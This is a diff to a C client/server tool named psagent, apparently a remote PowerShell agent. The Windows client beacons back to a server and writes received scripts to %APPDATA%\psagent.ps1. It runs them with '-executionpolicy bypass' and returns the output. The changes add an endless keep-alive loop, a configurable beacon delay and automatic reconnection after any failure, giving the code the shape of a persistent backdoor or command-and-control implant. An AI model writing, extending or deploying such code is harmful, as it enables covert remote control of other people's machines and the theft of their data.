@@ -24,6 +24,7 @@
     #include <arpa/inet.h>
     #include <netdb.h>
     #include <unistd.h>
+    #include <signal.h>
 #endif
 
 #include <stdio.h>
@@ -115,7 +116,8 @@ unsigned long hostnameToIP(const char *hostname)
 void writeToSocket(int *s, const char *str)
 {
     write(*s, str, strlen(str));
-    write(*s, "\0", sizeof(char));
+    /* send 1 byte segment after all data has been sent */
+    write(*s, "\0", 1);
 }
 char *readFromSocket(int *s)
 {
@@ -127,6 +129,8 @@ char *readFromSocket(int *s)
 
     do
     {
+        /* end of read when we get 1 byte segment */
+        if(bytes == 1) break;
         counter += 1;
         bytes_all += bytes;
         ptr = realloc(buffer, BUFFER * counter);
@@ -173,7 +177,7 @@ void printConvWc(const char *command)
         command += len;
     }
 }
-void runServer(int argc, char *argv[])
+void runServer(int argc, char *argv[], int keep, int delay)
 {
     char *buffer = NULL;
     unsigned short port = 0;
@@ -250,6 +254,16 @@ void runServer(int argc, char *argv[])
     fprintf(stderr, "Running in server mode\n");
     fprintf(stderr, "Port: %d\n", port);
 
+    /* block signals */
+    sigset_t sig;
+    sigemptyset(&sig);
+    sigaddset(&sig, SIGINT);
+    sigaddset(&sig, SIGTERM);
+
+    if(sigprocmask(SIG_BLOCK, &sig, NULL) == -1) return;
+
+    sigset_t sig_p;
+
     int s, peer_s;
     if(acceptConnection(&s, &peer_s, "0.0.0.0", port) != 0)
     {
@@ -259,31 +273,44 @@ void runServer(int argc, char *argv[])
     }
     fprintf(stderr, "Client connected\n");
 
+    do {
+    /* break when signals caught */
+    sigpending(&sig_p);
+    if(sigismember(&sig_p, SIGINT) == 1 || sigismember(&sig_p, SIGTERM) == 1) 
+    {
+        /* close connection on other end */
+        write(s, "\0", 1);
+        break;
+    }
+
     /* send command/script to client */
     writeToSocket(&peer_s, buffer);
-    shutdown(peer_s, SHUT_WR);
+    //shutdown(peer_s, SHUT_WR);
 
     /* retrieve output from client */
     char *command = readFromSocket(&peer_s);
     if(command == NULL)
     {
         fprintf(stderr, "Reading command from client failed\n");
-        free(buffer);
-        return;
+        break;
     }
-    shutdown(peer_s, SHUT_RD);
+    //shutdown(peer_s, SHUT_RD);
 
     /* convert char to wchar_t that was originally sent by client */
     printConvWc(command);
 
-    /* clean up */
     free(command);
+
+    if(keep)
+        sleep(delay);
+    } while(keep);
+
     free(buffer);
     close(peer_s);
     close(s);
 }
 #else
-void runServer(int argc, char *argv[])
+void runServer(int argc, char *argv[], int keep, int delay)
 {
     printf("Windows machine cannot run in server mode\n");
     printf("Closing!\n");
@@ -312,7 +339,17 @@ int writeWcToSocket(SOCKET *s, const wchar_t *str)
         len += wcrtomb(buffer + len, *str, NULL);
         ++str;
     }
-    send(*s, buffer, strlen(buffer) + MB_CUR_MAX, 0);
+    if(strlen(buffer) + MB_CUR_MAX == 1)
+    {
+        /* send 1 byte segment after all data has been sent */
+        send(*s, "\0", 1, 0);
+    }
+    else
+    {
+        send(*s, buffer, strlen(buffer) + MB_CUR_MAX, 0);
+        /* send 1 byte segment after all data has been sent */
+        send(*s, "\0", 1, 0);
+    }
 
     return 0;
 }
@@ -327,6 +364,8 @@ char *readFromSocket(SOCKET *s)
 
     do
     {
+        /* end of read when we get 1 byte segment */
+        if(bytes == 1) break;
         counter += 1;
         bytes_all += bytes;
         ptr = realloc(buffer, BUFFER * counter);
@@ -341,7 +380,7 @@ char *readFromSocket(SOCKET *s)
     return buffer;
 }
 
-int establishConnection(SOCKET *s, WSADATA *wsa, const char *host, unsigned short port)
+int establishConnection(SOCKET *s, WSADATA *wsa, const char *host, unsigned short port, int delay)
 {
     struct sockaddr_in server_info;
 
@@ -355,12 +394,12 @@ int establishConnection(SOCKET *s, WSADATA *wsa, const char *host, unsigned shor
     if((server_info.sin_addr.s_addr = hostnameToIP(host)) == 0) return -1;
 
     while(connect(*s, (struct sockaddr *)&server_info, sizeof(server_info)) != 0)
-        Sleep(10000);
+        Sleep(delay * 1000);
 
     return 0;
 }
 
-void runClient(int argc, char *argv[])
+void runClient(int argc, char *argv[], int keep, int delay)
 {
     char hostname[HOST_MAX] = {0};
     unsigned short port = 0;
@@ -403,7 +442,10 @@ void runClient(int argc, char *argv[])
     /* establish connection to server */
     SOCKET s;
     WSADATA wsa;
-    if(establishConnection(&s, &wsa, hostname, port) != 0)
+
+    /* set up a new connection on error in loop */
+    NEW_CONNECTION:
+    if(establishConnection(&s, &wsa, hostname, port, delay) != 0)
     {
         fprintf(stderr, "Failed to set up connection\n");
         closesocket(s);
@@ -412,16 +454,16 @@ void runClient(int argc, char *argv[])
     }
     fprintf(stderr, "Established connection to server\n");
 
+    do {
     /* get command/script from remote host */
     char *command = readFromSocket(&s);
-    if(command == NULL)
+    if(command == NULL || strcmp(command, "") == 0) // command is empty if e.g. server sent null byte to close the connection
     {
-        fprintf(stderr, "Reading command from remote host failed\n");
         closesocket(s);
         WSACleanup();
-        return NULL;
+        goto NEW_CONNECTION;
     }
-    shutdown(s, SD_RECEIVE);
+    //shutdown(s, SD_RECEIVE);
 
     /* get APPDATA path */
     const char *appdata = getenv("APPDATA");
@@ -431,7 +473,7 @@ void runClient(int argc, char *argv[])
         free(command);
         closesocket(s);
         WSACleanup();
-        return;
+        goto NEW_CONNECTION;
     }
 
     /* path to psagent.ps1 */
@@ -443,7 +485,7 @@ void runClient(int argc, char *argv[])
         free(command);
         closesocket(s);
         WSACleanup();
-        return;
+        goto NEW_CONNECTION;
     }
     snprintf(ps1_path, file_path_s, "%s\\psagent.ps1", appdata);
 
@@ -456,7 +498,7 @@ void runClient(int argc, char *argv[])
         free(command);
         closesocket(s);
         WSACleanup();
-        return;
+        goto NEW_CONNECTION;
     }
     if(writeToFile(fout, command) != 0)
     {
@@ -466,7 +508,7 @@ void runClient(int argc, char *argv[])
         free(command);
         closesocket(s);
         WSACleanup();
-        return;
+        goto NEW_CONNECTION;
     }
     /* command no longer needed */
     free(command);
@@ -480,7 +522,7 @@ void runClient(int argc, char *argv[])
         free(ps1_path);
         closesocket(s);
         WSACleanup();
-        return;
+        goto NEW_CONNECTION;
     }
     snprintf(dat_path, file_path_s, "%s\\psagent.dat", appdata);
 
@@ -494,7 +536,7 @@ void runClient(int argc, char *argv[])
         free(ps1_path);
         closesocket(s);
         WSACleanup();
-        return;
+        goto NEW_CONNECTION;
     }
     snprintf(cmd, cmd_s, "powershell -executionpolicy bypass -command \"& %s 2>&1 | Out-File -Encoding utf8 -FilePath %s\"", ps1_path, dat_path);
 
@@ -510,7 +552,7 @@ void runClient(int argc, char *argv[])
         free(dat_path);
         closesocket(s);
         WSACleanup();
-        return;
+        goto NEW_CONNECTION;
     }
     mbsrtowcs(dat_path_w, (const char **)&dat_path, file_path_s * sizeof(wchar_t) - 1, NULL);
     FILE *fin = _wfopen(dat_path_w, L"rt,ccs=UTF-8");
@@ -521,7 +563,7 @@ void runClient(int argc, char *argv[])
         free(dat_path);
         closesocket(s);
         WSACleanup();
-        return;
+        goto NEW_CONNECTION;
     }
 
     wchar_t *output = readWcFromFile(fin);
@@ -533,7 +575,7 @@ void runClient(int argc, char *argv[])
         free(dat_path);
         closesocket(s);
         WSACleanup();
-        return;
+        goto NEW_CONNECTION;
     }
     fclose(fin);
 
@@ -546,19 +588,20 @@ void runClient(int argc, char *argv[])
         free(dat_path);
         closesocket(s);
         WSACleanup();
-        return;
+        goto NEW_CONNECTION;
     }
-    shutdown(s, SD_SEND);
+    //shutdown(s, SD_SEND);
 
-    /* clean up */
     free(output);
     free(dat_path_w);
     free(dat_path);
+    } while(keep);
+
     closesocket(s);
     WSACleanup();
 }
 #else
-void runClient(int argc, char *argv[])
+void runClient(int argc, char *argv[], int keep, int delay)
 {
     printf("Only Windows machine can run in client mode\n");
     printf("Closing!\n");
@@ -569,6 +612,8 @@ void printHelp()
 {
     printf("Usage for psagent version 1.0\n");
     printf("\t\t-m - operation mode (client/server)\n");
+    printf("\t\t-k - keep connection open (recommended, reduces new connection overhead, spamming retransmission packets, etc.)\n");
+    printf("\t\t-d - delay (default 10, client sends SYN flag every -d seconds and if -k option specified then command/script is run every -d seconds)\n");
     printf("\nServer options\n");
     printf("\t\t-p - port to listen on for connections\n");
     printf("\t\t-c - ps command to run on remote host\n");
@@ -583,6 +628,8 @@ int main(int argc, char *argv[])
     /* polskie znaki */
     setlocale(LC_ALL, "");
 
+    int keep = 0;
+    int delay = 10;
     const char *mode = NULL;
     for(int i = 1; i < argc; i++)
     {
@@ -600,6 +647,21 @@ int main(int argc, char *argv[])
             else
                 break;
         }
+        else if(!(strcmp("-k", argv[i])))
+        {
+            keep = 1;
+        }
+        else if(!(strcmp("-d", argv[i])))
+        {
+            if(argv[i + 1] != NULL)
+            {
+                char delay_s[10];
+                snprintf(delay_s, 10, "%s", argv[i + 1]);
+                delay = strtol(delay_s, NULL, 0);
+            }
+            else
+                break;
+        }
     }
 
     if(mode == NULL)
@@ -609,9 +671,9 @@ int main(int argc, char *argv[])
     }
 
     if(!(strcmp(mode, "server")))
-        runServer(argc, argv);
+        runServer(argc, argv, keep, delay);
     else if(!(strcmp(mode, "client")))
-        runClient(argc, argv);
+        runClient(argc, argv, keep, delay);
 
     return 0;
 }
